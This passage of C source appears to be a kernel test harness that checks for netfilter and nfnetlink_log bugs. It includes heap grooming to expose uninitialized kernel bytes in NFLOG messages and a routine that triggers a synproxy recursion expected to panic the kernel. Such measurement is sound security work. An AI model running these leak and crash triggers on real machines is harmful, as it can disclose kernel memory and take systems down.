{
	int i, len = 0;

	if (f->errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", f->errs);
		return;
	}
	if (f->errs > 0) {
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.70s",
			 f->e1 ? -f->e1 : 0, g_extack[0] ? g_extack : "none");
		return;
	}
	if (!mode_note || !mode_note[0]) {
		snprintf(out, n, "setup=OK|send=%s", deliv(f->sr));
		return;
	}
	len = snprintf(out, n, "setup=OK|send=%s|n=%d|pay=", deliv(f->sr), f->r.n);
	for (i = 0; i < f->r.n && i < 32 && len < (int)n - 4; i++)
		len += snprintf(out + len, n - len, "%02x", f->r.pay[i]);
}

/* family door: <fam, hooknum, dev, prog> */
static int sc_fam(uint8_t fam, int hook, const char *dev, int prog,
		  char *out, size_t n)
{
	struct f13_res f;

	memset(&f, 0, sizeof(f));
	nops = 0;
	nrecs = 0;
	op_newtable_fam(fam, "ft");
	op_newchain_fam(fam, "ft", "c", hook, 0, NF_ACCEPT, dev);
	if (prog != P_FAM_NORULE)
		op_newrule_f13(fam, "ft", "c", prog);
	f.errs = nf_flush();
	f.e1 = g_err;
	if (f.errs == 0)
		f.sr = probe_send_reg(&f.r);
	f13_report("pay", &f, out, n);
	return 0;
}

static int sc_fam_norule(char *out, size_t n)  { return sc_fam(F13_NETDEV, F13_NF_NETDEV_INGRESS, "lo", P_FAM_NORULE, out, n); }
static int sc_fam_meta(char *out, size_t n)    { return sc_fam(F13_NETDEV, F13_NF_NETDEV_INGRESS, "lo", P_FAM_META_ND, out, n); }
static int sc_fam_rt_in4(char *out, size_t n)  { return sc_fam(NFPROTO_IPV4, NF_INET_LOCAL_IN, NULL, P_FAM_RT_IN4, out, n); }
static int sc_fam_mss_nd(char *out, size_t n)  { return sc_fam(F13_NETDEV, F13_NF_NETDEV_INGRESS, "lo", P_FAM_RT_MSS_ND, out, n); }
static int sc_fam_rt_nd(char *out, size_t n)   { return sc_fam(F13_NETDEV, F13_NF_NETDEV_INGRESS, "lo", P_FAM_RT_ND, out, n); }
static int sc_fam_rt_arp(char *out, size_t n)  { return sc_fam(F13_ARP, F13_NF_ARP_IN, NULL, P_FAM_RT_ARP, out, n); }
static int sc_fam_xfrm_nd(char *out, size_t n) { return sc_fam(F13_NETDEV, F13_NF_NETDEV_INGRESS, "lo", P_FAM_RT_XFRM_ND, out, n); }

/* exthdr door: <prog> */
static int sc_eh(int prog, char *out, size_t n)
{
	struct f13_res f;

	memset(&f, 0, sizeof(f));
	nops = 0;
	nrecs = 0;
	op_newtable_fam(NFPROTO_IPV4, "et");
	op_newchain_fam(NFPROTO_IPV4, "et", "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT, NULL);
	op_newrule_f13(NFPROTO_IPV4, "et", "c", prog);
	f.errs = nf_flush();
	f.e1 = g_err;
	if (f.errs == 0)
		f.sr = probe_send_reg(&f.r);
	f13_report("pay", &f, out, n);
	return 0;
}

static int sc_eh_const(char *out, size_t n)   { return sc_eh(P_EH_CONST, out, n); }
static int sc_eh_len1(char *out, size_t n)    { return sc_eh(P_EH_LEN1, out, n); }
static int sc_eh_len4(char *out, size_t n)    { return sc_eh(P_EH_LEN4, out, n); }
static int sc_eh_len16(char *out, size_t n)   { return sc_eh(P_EH_LEN16, out, n); }
static int sc_eh_len16i(char *out, size_t n)  { return sc_eh(P_EH_LEN16I, out, n); }
static int sc_eh_nopres(char *out, size_t n)  { return sc_eh(P_EH_NOPRESENT, out, n); }

/* objref door: <object type, hook> */
static int sc_obj(uint32_t objtype, int hook, int prog, char *out, size_t n)
{
	struct f13_res f;

	memset(&f, 0, sizeof(f));
	nops = 0;
	nrecs = 0;
	op_newtable_fam(NFPROTO_IPV4, "ot");
	op_newchain_fam(NFPROTO_IPV4, "ot", "c", hook, 0, NF_ACCEPT, NULL);
	if (objtype == F13_OBJ_SYNPROXY)
		op_newobj(NFPROTO_IPV4, "ot", "os", F13_OBJ_SYNPROXY);
	else
		op_newobj(NFPROTO_IPV4, "ot", "oc", F13_OBJ_COUNTER);
	op_newrule_f13(NFPROTO_IPV4, "ot", "c", prog);
	f.errs = nf_flush();
	f.e1 = g_err;
	if (f.errs == 0)
		f.sr = probe_send_reg(&f.r);
	f13_report("", &f, out, n);
	return 0;
}

static int sc_obj_counter_out(char *out, size_t n)
{
	return sc_obj(F13_OBJ_COUNTER, NF_INET_LOCAL_OUT, P_OBJ_COUNTER_OUT, out, n);
}
static int sc_obj_syn_in(char *out, size_t n)
{
	return sc_obj(F13_OBJ_SYNPROXY, NF_INET_LOCAL_IN, P_OBJ_SYN_IN, out, n);
}
static int sc_obj_syn_out(char *out, size_t n)
{
	return sc_obj(F13_OBJ_SYNPROXY, NF_INET_LOCAL_OUT, P_OBJ_SYN_OUT, out, n);
}

/* the same rule as obj.door.synproxy_out, then one TCP SYN out of the box:
 * synproxy_send_client_synack() re-enters the OUTPUT hook, and there is no
 * recursion guard anywhere in that path.  Runs alone and last. */
static int sc_obj_crash(char *out, size_t n)
{
	struct f13_res f;
	int fd, r;
	struct sockaddr_in a;

	memset(&f, 0, sizeof(f));
	nops = 0;
	nrecs = 0;
	op_newtable_fam(NFPROTO_IPV4, "ot");
	op_newchain_fam(NFPROTO_IPV4, "ot", "c", NF_INET_LOCAL_OUT, 0, NF_ACCEPT, NULL);
	op_newobj(NFPROTO_IPV4, "ot", "os", F13_OBJ_SYNPROXY);
	op_newrule_f13(NFPROTO_IPV4, "ot", "c", P_OBJ_SYN_OUT);
	f.errs = nf_flush();
	f.e1 = g_err;
	if (f.errs != 0) {
		snprintf(out, n, "setup=ERR|errno=%d|syn=skipped",
			 f.e1 ? -f.e1 : 0);
		return 0;
	}
	fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
	if (fd < 0) {
		snprintf(out, n, "setup=OK|syn=sockfail_%d", errno);
		return 0;
	}
	memset(&a, 0, sizeof(a));
	a.sin_family = AF_INET;
	a.sin_addr.s_addr = htonl(0x0a000003);
	a.sin_port = htons(9999);
	errno = 0;
	r = connect(fd, (struct sockaddr *)&a, sizeof(a));
	snprintf(out, n, "setup=OK|syn=connect_rc_%d_errno_%d", r, r ? errno : 0);
	close(fd);
	return 0;
}

static void run_fam(void)
{
	/* controls first; the two doors last, because a door that panics would
	 * take the rest of the boot with it */
	run_new("fam.ctl.norule", sc_fam_norule, 30);
	run_new("fam.ctl.meta_netdev", sc_fam_meta, 30);
	run_new("fam.ctl.rt_inet4", sc_fam_rt_in4, 30);
	run_new("fam.ctl.rt_mss_netdev", sc_fam_mss_nd, 30);
	run_new("fam.door.rt_xfrm_netdev", sc_fam_xfrm_nd, 30);
	run_new("fam.door.rt_netdev", sc_fam_rt_nd, 30);
	run_new("fam.door.rt_arp", sc_fam_rt_arp, 30);
}

static void run_exh(void)
{
	run_new("exh.ctl.const", sc_eh_const, 30);
	run_new("exh.ctl.len1", sc_eh_len1, 30);
	run_new("exh.ctl.nopresent", sc_eh_nopres, 30);
	run_new("exh.ctl.len4", sc_eh_len4, 30);
	run_new("exh.door.len16i", sc_eh_len16i, 30);
	run_new("exh.door.len16", sc_eh_len16, 30);
}

static void run_obj(void)
{
	run_new("obj.ctl.counter_out", sc_obj_counter_out, 30);
	run_new("obj.ctl.synproxy_in", sc_obj_syn_in, 30);
	run_new("obj.door.synproxy_out", sc_obj_syn_out, 30);
}

static void run_objcrash(void)
{
	run_new("obj.crash.synproxy_out_syn", sc_obj_crash, 60);
}

/* ================= turn 537: nfnetlink_log -- three doors in one family =================
 *
 * Bucket B's largest family: 8 of the 24 commits that were still unmeasured live in
 * net/netfilter/nfnetlink_log.c.  Three of them move *bytes inside a netlink message*
 * rather than a verdict, so the vocabulary this turn needs is not another expression
 * but another reader: an NFLOG socket that dumps the raw datagram and parses it by hand.
 *
 *   a8365d1064de  NFULA_PAYLOAD is built with skb_put()+skb_copy_bits(); the 1..3
 *                 trailing alignment bytes of the attribute are never written and are
 *                 sent to userspace as they were in the heap.        (nla_reserve fixes)
 *   368c22aea490  the NLMSG_DONE terminator that closes a batch with qlen > 1 gets its
 *                 nfgenmsg from nlmsg_put(), which zeroes only the alignment padding
 *                 after the payload -- the four payload bytes are stale heap.
 *   607245c4dbb8  the batch buffer is sized with nla_total_size(sizeof(nfgenmsg)) where
 *                 nlmsg_total_size() is required, i.e. 16 bytes short; the terminator
 *                 then does not fit, WARN_ONCE fires and the whole batch is dropped.
 *
 * Reaching the family at all costs one config symbol: CONFIG_NFT_LOG is *not set* in
 * the reference config, so the nft "log" expression does not exist there (xt_NFLOG is
 * compiled, so the door is not missing from the image -- it is missing from my
 * instrument; same class as turn 536).  Config D537 = reference + exactly that symbol.
 *
 * Every scenario runs in its own netns (run_new() already does that), binds an NFLOG
 * instance on its own group and reads the raw datagrams.  Nothing here needs the
 * packet to be delivered: the log happens in LOCAL_IN before any receiver.
 */

#define NFNL_SUBSYS_ULOG	4
#define NFULNL_MSG_PACKET	0
#define NFULNL_MSG_CONFIG	1
#define NFULA_PACKET_HDR	1
#define NFULA_PAYLOAD		9
#define NFULA_CFG_CMD		1
#define NFULA_CFG_MODE		2
#define NFULA_CFG_TIMEOUT	4
#define NFULA_CFG_QTHRESH	5
#define NFULNL_CFG_CMD_BIND	1
#define NFULNL_COPY_PACKET	0x02
#define NFTA_LOG_GROUP		1
#define NFTA_LOG_QTHRESHOLD	4
#define NLMSG_DONE_		3

struct nfl_res {
	int msgs;                       /* NFULNL_MSG_PACKET messages seen        */
	int batches;                    /* datagrams read                        */
	int done_seen;                  /* NLMSG_DONE terminators                */
	unsigned char done_body[8];
	int done_len;
	int pad_seen;                   /* NFULA_PAYLOAD attrs with padlen > 0    */
	int pad_nonzero;                /* ... of which some pad byte != 0        */
	int pad_match;                  /* ... every pad byte == 0x5a (my groom)  */
	int pad_11;                     /* ... every pad byte == 0x11 (my probe)  */
	int pad_other;                  /* ... neither: foreign heap bytes        */
	unsigned char pad_sample[4];    /* first pad, whatever it held            */
	int pad_sample_len;
	unsigned char pad_nz_sample[4]; /* first pad that was NOT all zero        */
	int pad_nz_sample_len;
	unsigned char hdr[4];           /* nfgenmsg of the first PACKET message   */
	int hdr_len;
	int mlen_min, mlen_max;         /* message lengths                        */
	int dgram_msgs;                 /* messages in the datagram being parsed  */
	int max_dgram_msgs;             /* the most any one datagram carried      */
	int done_zero, done_hdr, done_5a, done_other;
	unsigned char done_nz_sample[4];
};

/* ---- two expressions the log rule needs so that it logs only MY packets ----
 * The first run of this battery (logs/f14_iter1_*) logged 12 messages for 6
 * datagrams: the UDP packet *and* the ICMP port-unreachable it provokes both
 * traverse LOCAL_IN of this netns, and a bare `log` rule matches both.  A filter
 * on (ip protocol == UDP) and (udp dport == 9999) makes one packet one message,
 * which is what the counters below assume. */
static void nfl_load(struct nlmsghdr *nlh, uint32_t dreg, uint32_t base,
		     uint32_t off, uint32_t len)
{
	struct nlattr *elem, *edata;

	elem = nest_start(nlh, NFTA_LIST_ELEM, "lg.load");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "lg.load.name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "lg.load.data");
	put_be32(nlh, NFTA_PAYLOAD_DREG, dreg, "lg.load.dreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "lg.load.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "lg.load.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "lg.load.len");
	nest_end(nlh, edata);
	nest_end(nlh, elem);
}

static void nfl_cmp_eq(struct nlmsghdr *nlh, uint32_t sreg, int len,
		       const void *val)
{
	struct nlattr *elem, *edata, *cdata;

	elem = nest_start(nlh, NFTA_LIST_ELEM, "lg.cmp");
	put_str(nlh, NFTA_EXPR_NAME, "cmp", "lg.cmp.name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "lg.cmp.data");
	put_be32(nlh, NFTA_CMP_SREG, sreg, "lg.cmp.sreg");
	put_be32(nlh, NFTA_CMP_OP, NFT_CMP_EQ, "lg.cmp.op");
	cdata = nest_start(nlh, NFTA_CMP_DATA, "lg.cmp.data.data");
	attr_put(nlh, NFTA_DATA_VALUE, val, len, "lg.cmp.value");
	nest_end(nlh, cdata);
	nest_end(nlh, edata);
	nest_end(nlh, elem);
}

/* ---- the nft "log" expression: one rule, one group ---- */
static struct nlmsghdr *op_newrule_log(const char *table, const char *chain,
				       int group, int qthresh)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs, *elem, *edata;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "lg.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "lg.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "lg.rule.exprs");

	/* only my own datagrams: ip protocol == UDP, udp dport == 9999 */
	nfl_load(nlh, NFT_REG_1, NFT_PAYLOAD_NETWORK_HEADER, 9, 1);
	{
		unsigned char proto = IPPROTO_UDP;

		nfl_cmp_eq(nlh, NFT_REG_1, 1, &proto);
	}
	nfl_load(nlh, NFT_REG_1, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2);
	{
		uint16_t dport = htons(9999);

		nfl_cmp_eq(nlh, NFT_REG_1, 2, &dport);
	}

	elem = nest_start(nlh, NFTA_LIST_ELEM, "lg.rule.exprs[0]");
	put_str(nlh, NFTA_EXPR_NAME, "log", "lg.rule.exprs[0].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "lg.rule.exprs[0].data");
	{
		uint16_t g = htons((uint16_t)group);

		attr_put(nlh, NFTA_LOG_GROUP, &g, 2, "lg.log.group");
	}
	if (qthresh > 0) {
		uint16_t q = htons((uint16_t)qthresh);

		attr_put(nlh, NFTA_LOG_QTHRESHOLD, &q, 2, "lg.log.qthresh");
	}
	nest_end(nlh, edata);
	nest_end(nlh, elem);

	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---- the NFLOG socket: bind an instance on one group and keep reading ---- */
static int nfl_ulog_open(int group, int qthresh)
{
	char msg[512], rbuf[1024];
	struct nlmsghdr *nlh;
	struct nfgenmsg_ *nfg;
	struct sockaddr_nl sa;
	int fd, rcv = 1 << 21, r;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	if (fd < 0)
		return -1;
	setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -2;
	}

	memset(msg, 0, sizeof(msg));
	nlh = (struct nlmsghdr *)msg;
	nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(struct nfgenmsg_);
	nlh->nlmsg_type = (uint16_t)((NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_CONFIG);
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 1;
	nfg = (struct nfgenmsg_ *)NLMSG_DATA(nlh);
	nfg->nfgen_family = 0;              /* AF_UNSPEC */
	nfg->version = 0;
	nfg->res_id = htons((uint16_t)group);

	{
		uint8_t cmd = NFULNL_CFG_CMD_BIND;      /* struct is __packed, 1 byte */

		attr_put(nlh, NFULA_CFG_CMD, &cmd, 1, NULL);
	}
	{
		struct {
			uint32_t range;
			uint8_t mode;
			uint8_t pad;
		} __attribute__((packed)) cm;

		cm.range = htonl(0);       /* 0 -> NFULNL_COPY_RANGE_MAX */
		cm.mode = NFULNL_COPY_PACKET;
		cm.pad = 0;
		attr_put(nlh, NFULA_CFG_MODE, &cm, sizeof(cm), NULL);
	}
	{
		uint32_t q = htonl((uint32_t)qthresh);
		uint32_t t = htonl(2);     /* 20 ms flush timer */

		attr_put(nlh, NFULA_CFG_QTHRESH, &q, 4, NULL);
		attr_put(nlh, NFULA_CFG_TIMEOUT, &t, 4, NULL);
	}
	if (send(fd, msg, nlh->nlmsg_len, 0) != (ssize_t)nlh->nlmsg_len) {
		close(fd);
		return -3;
	}
	r = (int)recv(fd, rbuf, sizeof(rbuf), 0);
	if (r < (int)(NLMSG_HDRLEN + sizeof(struct nlmsgerr))) {
		close(fd);
		return -4;
	}
	{
		struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;

		if (rh->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(rh);

			if (e->error) {
				close(fd);
				return -5;
			}
		}
	}
	return fd;
}

static void nfl_attrs(const unsigned char *p, int len, struct nfl_res *r)
{
	int off = 0;

	while (off + (int)sizeof(struct nlattr) <= len) {
		const struct nlattr *a = (const struct nlattr *)(p + off);
		int alen = (int)a->nla_len;
		int pad, i, nz = 0, mt = 1;

		if (alen < (int)sizeof(struct nlattr) || off + alen > len)
			break;
		pad = (int)(NLA_ALIGN_(alen) - alen);
		if ((a->nla_type & 0x3fff) == NFULA_PAYLOAD && pad > 0) {
			const unsigned char *pb = p + off + alen;
			int a5 = 1, a11 = 1;

			r->pad_seen++;
			for (i = 0; i < pad; i++) {
				if (pb[i])
					nz = 1;
				if (pb[i] != 0x5a) {
					mt = 0;
					a5 = 0;
				}
				if (pb[i] != 0x11)
					a11 = 0;
			}
			if (nz) {
				r->pad_nonzero++;
				if (mt)
					r->pad_match++;
				else if (a11)
					r->pad_11++;
				else
					r->pad_other++;
				if (!r->pad_nz_sample_len) {
					for (i = 0; i < pad && i < 4; i++)
						r->pad_nz_sample[i] = pb[i];
					r->pad_nz_sample_len = pad;
				}
			}
			if (!r->pad_sample_len) {
				for (i = 0; i < pad && i < 4; i++)
					r->pad_sample[i] = pb[i];
				r->pad_sample_len = pad;
			}
		}
		off += (int)NLA_ALIGN_(alen);
	}
}

static void nfl_parse(const unsigned char *buf, int len, struct nfl_res *r)
{
	const struct nlmsghdr *nlh = (const struct nlmsghdr *)buf;
	int rem = len;

	r->dgram_msgs = 0;

	while (NLMSG_OK(nlh, rem)) {
		uint16_t type = nlh->nlmsg_type;

		if (type == NLMSG_DONE_) {
			r->done_seen++;
			if (nlh->nlmsg_len >= NLMSG_HDRLEN + 4) {
				const unsigned char *db = NLMSG_DATA(nlh);
				int zero = 1, five = 1;

				for (int i = 0; i < 4; i++) {
					if (db[i])
						zero = 0;
					if (db[i] != 0x5a)
						five = 0;
				}
				if (r->done_len == 0) {
					memcpy(r->done_body, db, 4);
					r->done_len = 4;
				}
				if (zero)
					r->done_zero++;
				else if (five)
					r->done_5a++;
				else if (db[0] == 0 && db[1] == 0 &&
					 db[2] == 0 && db[3] == 3)
					r->done_hdr++;
				else {
					r->done_other++;
					if (!r->done_nz_sample[0])
						memcpy(r->done_nz_sample, db, 4);
				}
			}
		} else if (type == (uint16_t)((NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_PACKET)) {
			const unsigned char *p = (const unsigned char *)NLMSG_DATA(nlh);
			int plen = (int)nlh->nlmsg_len - NLMSG_HDRLEN;

			r->msgs++;
			r->dgram_msgs++;
			if (r->dgram_msgs > r->max_dgram_msgs)
				r->max_dgram_msgs = r->dgram_msgs;
			if (r->mlen_min == 0 || (int)nlh->nlmsg_len < r->mlen_min)
				r->mlen_min = (int)nlh->nlmsg_len;
			if ((int)nlh->nlmsg_len > r->mlen_max)
				r->mlen_max = (int)nlh->nlmsg_len;
			if (!r->hdr_len && plen >= 4) {
				memcpy(r->hdr, p, 4);
				r->hdr_len = 4;
			}
			if (plen >= 4)
				nfl_attrs(p + 4, plen - 4, r);
		}
		nlh = NLMSG_NEXT(nlh, rem);
	}
}

/* read datagrams until the socket is quiet: first read waits first_ms, every
 * further one 30 ms.  One flush is one datagram, so the tail is short. */
static int nfl_drain(int fd, struct nfl_res *r, int first_ms)
{
	unsigned char buf[131072];
	int got = 0;

	while (got < 4096) {
		struct timeval tv;
		int n, ms = got ? 30 : first_ms;

		tv.tv_sec = ms / 1000;
		tv.tv_usec = (ms % 1000) * 1000;
		setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		n = (int)recv(fd, buf, sizeof(buf), 0);
		if (n <= 0)
			break;
		got++;
		nfl_parse(buf, n, r);
	}
	r->batches += got;
	return got;
}

static int nfl_send_pkts(int n, int paylen, unsigned char pat)
{
	struct sockaddr_in dst;
	unsigned char *p;
	int s, i;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0)
		return -1;
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = htonl(0x0a000003);
	dst.sin_port = htons(9999);
	p = malloc((size_t)(paylen > 0 ? paylen : 1));
	if (!p) {
		close(s);
		return -2;
	}
	memset(p, pat, (size_t)paylen);
	for (i = 0; i < n; i++)
		sendto(s, p, (size_t)paylen, 0, (struct sockaddr *)&dst, sizeof(dst));
	free(p);
	close(s);
	return 0;
}

/* table + chain + log rule + bound instance.  1 = ready, 0 = batch rejected,
 * <0 = local failure; *fdp is set only when 1 is returned. */
static int nfl_setup(const char *tab, int group, int qthresh, char *out,
		     size_t n, int *fdp)
{
	int fd, errs;

	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	if (op_newrule_log(tab, "c", group, qthresh) == NULL) {
		snprintf(out, n, "setup=BUILD_FAIL");
		return -1;
	}
	fd = nfl_ulog_open(group, qthresh);
	if (fd < 0) {
		snprintf(out, n, "setup=ULOG_OPEN_%d", fd);
		return -1;
	}
	errs = nf_flush();
	if (errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		close(fd);
		return -1;
	}
	if (errs > 0) {
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.80s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		close(fd);
		return 0;
	}
	*fdp = fd;
	return 1;
}

/* The NFLOG buffer is alloc_skb(NLMSG_GOODSIZE ~ 3.7 kB) -> a kmalloc-4k chunk.
 * The first run groomed it with two 1000-byte packets, whose skb heads live in
 * kmalloc-2k: the wrong slab, so the padding read 000000 on every kernel and the
 * door looked closed.  This groom sends big datagrams whose *own* logged messages
 * are written into kmalloc-4k chunks filled with 0x5a, then frees them. */
static int nfl_groom(int fd, int npkts, struct nfl_res *r)
{
	memset(r, 0, sizeof(*r));
	nfl_send_pkts(npkts, 3000, 0x5a);
	nfl_drain(fd, r, 500);
	return r->msgs;
}

/* ---- door 1: the 1..3 alignment bytes after NFULA_PAYLOAD ----
 * paylen residue decides the pad length (42+paylen or 28+paylen, both give the
 * same residue class), so the four scenarios differ in exactly one field.
 * The groom batch first writes 0x5a over the buffer the next allocation should
 * still be made of: if the pad bytes are 0x5a, they are mine, from one flush
 * earlier, and the leak is self-identifying rather than merely non-zero. */
static int sc_nfl_pad(int paylen, char *out, size_t n)
{
	struct nfl_res r;
	int fd = -1, k;

	int gm;

	memset(&r, 0, sizeof(r));
	k = nfl_setup("dt", 3, 2, out, n, &fd);
	if (k <= 0)
		return 0;
	gm = nfl_groom(fd, 40, &r);
	memset(&r, 0, sizeof(r));
	/* five rounds, not one: whether a stale byte is *zero* is a property of the
	 * chunk the allocator hands out, and the first round often gets a fresh page.
	 * After round 1 the chunks are dirty with my own 0x11 probes, which is the
	 * honest way to ask "is the padding written at all". */
	for (int i = 0; i < 10; i++) {
		nfl_send_pkts(6, paylen, 0x11);
		nfl_drain(fd, &r, 400);
	}
	snprintf(out, n, "setup=OK|sent=60|rounds=10|groom=40|groom_msgs=%d|msgs=%d|batches=%d|pad_seen=%d|pad_zero=%d|pad_nz=%d|pad_5a=%d|pad_11=%d|pad_other=%d|nzsample=%02x%02x%02x|padlen=%d|mlen=%d|hdr=%02x%02x%02x%02x",
		 gm, r.msgs, r.batches, r.pad_seen,
		 r.pad_seen - r.pad_nonzero, r.pad_nonzero, r.pad_match, r.pad_11,
		 r.pad_other,
		 r.pad_nz_sample[0], r.pad_nz_sample[1], r.pad_nz_sample[2],
		 r.pad_sample_len, r.mlen_min,
		 r.hdr[0], r.hdr[1], r.hdr[2], r.hdr[3]);
	close(fd);
	return 0;
}

/* Payload sizes, not pad lengths: the first run measured data_len = 28 + paylen
 * (no L2 header in this hook), so the pad length is (-(28+paylen)) mod 4 and the
 * label belongs on the measurement, not on my arithmetic. */
static int sc_nfl_pad_P43(char *out, size_t n) { return sc_nfl_pad(43, out, n); }
static int sc_nfl_pad_P44(char *out, size_t n) { return sc_nfl_pad(44, out, n); }
static int sc_nfl_pad_P45(char *out, size_t n) { return sc_nfl_pad(45, out, n); }
static int sc_nfl_pad_P46(char *out, size_t n) { return sc_nfl_pad(46, out, n); }

/* ---- door 2: the four nfgenmsg bytes inside the NLMSG_DONE terminator ----
 * A batch needs qlen > 1; with qthreshold 2 every second packet closes a batch.
 * The groom batch writes ~2.2 kB of 0x5a; the small batch that follows puts its
 * terminator at ~320 bytes, i.e. inside the groom's first payload.  The control
 * is the *same four bytes at the same offset of the preceding PACKET message*:
 * those are built with nfnl_msg_put() on both kernels and must read 02000003. */
static int sc_nfl_done(char *out, size_t n)
{
	struct nfl_res r;
	int fd = -1, k, gm;

	memset(&r, 0, sizeof(r));
	k = nfl_setup("dt", 3, 2, out, n, &fd);
	if (k <= 0)
		return 0;
	gm = nfl_groom(fd, 40, &r);
	memset(&r, 0, sizeof(r));
	for (int i = 0; i < 12; i++) {
		nfl_send_pkts(2, 64, 0x11);
		nfl_drain(fd, &r, 400);
	}
	snprintf(out, n, "setup=OK|sent=24|rounds=12|groom=40|groom_msgs=%d|msgs=%d|batches=%d|done=%d|done_zero=%d|done_hdr=%d|done_5a=%d|done_other=%d|nzsample=%02x%02x%02x%02x|hdr=%02x%02x%02x%02x|mlen=%d",
		 gm, r.msgs, r.batches, r.done_seen,
		 r.done_zero, r.done_hdr, r.done_5a, r.done_other, r.done_nz_sample[0],
		 r.done_nz_sample[1], r.done_nz_sample[2], r.done_nz_sample[3],
		 r.hdr[0], r.hdr[1], r.hdr[2], r.hdr[3], r.mlen_min);
	close(fd);
	return 0;
}

/* control for door 2: qthreshold 1 means every flush has qlen == 1, and
 * __nfulnl_send() only appends the terminator when qlen > 1 -- so there is no
 * NLMSG_DONE at all, on any kernel.  It says the terminator is a property of
 * batching, not something my parser invents. */
static int sc_nfl_nodone(char *out, size_t n)
{
	struct nfl_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	k = nfl_setup("dt", 3, 1, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(2, 64, 0x11);
	nfl_drain(fd, &r, 300);
	snprintf(out, n, "setup=OK|sent=2|msgs=%d|batches=%d|done=%d|hdr=%02x%02x%02x%02x",
		 r.msgs, r.batches, r.done_seen,
		 r.hdr[0], r.hdr[1], r.hdr[2], r.hdr[3]);
	close(fd);
	return 0;
}

/* ---- door 3: a batch the terminator does not fit into ---- */
static int nfl_probe(int paylen, int group)
{
	char tab[16];
	struct nfl_res r;
	int fd = -1, k, cnt;

	snprintf(tab, sizeof(tab), "d%d", group);
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	if (op_newrule_log(tab, "c", group, 2) == NULL)
		return -1;
	fd = nfl_ulog_open(group, 2);
	if (fd < 0)
		return -2;
	k = nf_flush();
	if (k != 0) {
		close(fd);
		return k > 0 ? -10 : -11;
	}
	memset(&r, 0, sizeof(r));
	nfl_send_pkts(2, paylen, 0x33);
	nfl_drain(fd, &r, 300);
	cnt = r.max_dgram_msgs;
	if (cnt == 0) {
		/* a dropped batch is reproducible; a slow one is not -- so ask twice */
		memset(&r, 0, sizeof(r));
		nfl_send_pkts(2, paylen, 0x33);
		nfl_drain(fd, &r, 500);
		cnt = r.max_dgram_msgs;
	}
	close(fd);
	return cnt;
}

static int sc_nfl_scan(char *out, size_t n)
{
	int p, cnt, group = 10;
	int s2 = 0, s1 = 0, s0 = 0, last_two = -1, first_one = -1;
	int ref[17], nref = 0, zeros = 0, zero_p = -1;
	int door_p, door_got = -1;

	/* warm-up: the first packet of a TCG boot is slow (turn 536 hit this), and a
	 * slow first batch would read as a dropped one.  One throwaway probe, not
	 * counted anywhere, pays that cost before the grid starts. */
	group++;
	(void)nfl_probe(200, group);

	/* coarse pass: find the payload at which a two-message batch stops fitting.
	 * "two messages" means two in ONE datagram (max_dgram_msgs), not two totals. */
	for (p = 64; p <= 3900; p += 64) {
		group++;
		cnt = nfl_probe(p, group);
		if (cnt < 0) {
			snprintf(out, n, "setup=PROBE_FAIL|p=%d|cnt=%d", p, cnt);
			return 0;
		}
		if (cnt >= 2) {
			s2++;
			/* only the LAST one *below the first single-message batch* counts.
			 * Higher payloads deliver two messages again because the buffer is
			 * the slab class the request lands in, not the request: at 3712 the
			 * diag scenario sees two 3860-byte messages in one datagram, which is
			 * impossible in a 4 kB buffer and fine in an 8 kB one.  Taking the
			 * last "2" overall would put the fine scan in the wrong slab. */
			if (first_one < 0)
				last_two = p;
		} else if (cnt == 1) {
			s1++;
			if (first_one < 0)
				first_one = p;
		} else {
			s0++;
		}
	}
	if (last_two < 0) {
		snprintf(out, n, "setup=NO_BRACKET|s2=0|s1=%d|s0=%d", s1, s0);
		return 0;
	}
	/* fine pass: the window is 8 bytes of message size wide, i.e. 8 bytes of
	 * payload, so a 64-byte grid can step over it.  Every 4-byte payload from the
